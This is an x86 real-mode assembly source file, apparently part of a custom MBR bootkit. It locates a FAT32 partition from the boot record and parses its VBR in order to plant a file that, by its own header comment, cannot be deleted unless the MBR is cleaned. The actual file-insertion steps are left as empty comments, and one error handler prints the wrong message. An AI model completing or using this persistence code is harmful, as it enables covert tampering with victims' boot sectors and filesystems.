;
;   This code tries to insert a file directly into a FAT32 filesystem.
;   Deleting this file using the filesystem will be impossible
;   Unless the MBR is cleaned.
;

[bits 16]
[org 0x800]

; memory addresses
; taken from custom_mbr.asm
%define SECTOR_TWO_ADDR     0x800
%define NEW_MBR_ADDR        0x600
%define FAT32_VBR_ADDR      0x1000

; offsets into the master boot record
%define MBR_PART_OFFSET         0x1be
%define PART_TYPE_OFFSET        0x2
%define PART_START_LBA_OFFSET   0x8

; offsets into the FAT32 VBR
%define SECTORS_PER_CLUSTER_OFFSET      0x0d    ; 1 byte
%define NUM_RESERVED_SECTORS_OFFSET     0x0e    ; 2 bytes
%define SECTORS_PER_FAT_OFFSET          0x24    ; 4 bytes
%define ROOT_CLUSTER_OFFSET             0x2c    ; 4 bytes

_start:
    pusha
    mov bx, NEW_MBR_ADDR + MBR_PART_OFFSET
    mov cx, 0x4

_scan_for_fat:
    mov al, BYTE [bx + PART_TYPE_OFFSET]
    cmp al, 0xb
    jz _load_fat_vbr
    cmp al, 0xc
    jz _load_fat_vbr
    add bx, 0x10
    dec cx
    jz _no_part_handler
    jmp _scan_for_fat

_load_fat_vbr:
    call _reset_disk

    mov esi, DWORD [bx + PART_START_LBA_OFFSET]
    mov DWORD [start_of_fs_addr], esi

    sub sp, 0x10
    push esi
    push DWORD 0x0

    push 0x0
    push FAT32_VBR_ADDR

    push 0x1
    push 0x10
    mov si, sp

    call _read_sector_lba
    add sp, 0x10

_check_extensions:
    cmp WORD [FAT32_VBR_ADDR + 0x1fe], 0xaa55
    jnz _not_a_vbr_handler

_process_vbr:
    mov si, processing_fat_vbr_msg
    call _print_str

    mov al, BYTE [FAT32_VBR_ADDR + SECTORS_PER_CLUSTER_OFFSET]
    mov BYTE [sectors_per_cluster], al

    mov eax, DWORD [FAT32_VBR_ADDR + SECTORS_PER_FAT_OFFSET]
    mov DWORD [sectors_per_fat], eax

    mov ax, WORD [FAT32_VBR_ADDR + NUM_RESERVED_SECTORS_OFFSET]
    mov WORD [num_reserved_sectors], ax

    mov eax, DWORD [FAT32_VBR_ADDR + ROOT_CLUSTER_OFFSET]
    mov DWORD [root_dir_cluster_num], eax

    ; calculate LBA address of root directory
    mov edi, DWORD [start_of_fs_addr]

    ; add the number of reserved sectors
    xor ecx, ecx
    mov cx, WORD [num_reserved_sectors]
    add edi, ecx

    ; add 2 * sectors_per_fat
    mov ecx, DWORD [sectors_per_fat]
    mov eax, 2
    mul ecx                             ; result is stored in edx:aax

    add edi, eax

    ; read in the root directory


    ; add en entry into the root directory

    ; copy back the modified root directory

    ; copy data to the first cluster of the directory entry 

_end:
    popa
    ret

_reset_disk:
    mov ah, 0x0
    int 0x13                    ; reset the disk
    jc _disk_io_error
    ret

_read_sector_chs:
    mov ah, 0x2
    int 0x13
    jc _disk_io_error
    ret

_read_sector_lba:
    mov ah, 0x42
    int 0x13
    jc _disk_io_error
    ret

_no_part_handler:
    mov si, no_fat_found_msg
    call _print_str
    jmp _end_loop

_not_a_vbr_handler:
    mov si, no_fat_found_msg
    call _print_str
    jmp _end_loop

_disk_io_error:
    mov si, disk_io_error_msg
    call _print_str
    jmp _end_loop

_print_str:
    lodsb
    or al, al               ; did we reach a null byte?
    jz _print_end
    mov ah, 0xe
    int 0x10
    jmp _print_str

_print_end:
    ret

_end_loop:                  ; after printing an error, we should just loop forever
    jmp _end_loop

no_fat_found_msg:           db "No fat partition found!", 0x0d, 0x0a, 0x00
not_a_vbr:                  db "[Persistence]: Not a fat vbr!", 0x0d, 0x0a, 0x00
processing_fat_vbr_msg:     db "Processing FAT32 VBR!", 0x0d, 0x0a, 0x00
disk_io_error_msg:          db "Disk IO error!", 0x0d, 0x0a, 0x00

sectors_per_cluster:     db 0x00
start_of_fs_addr:        dd 0x00
sectors_per_fat:         dd 0x00
num_reserved_sectors:    dw 0x00
root_dir_cluster_num:    dd 0x00
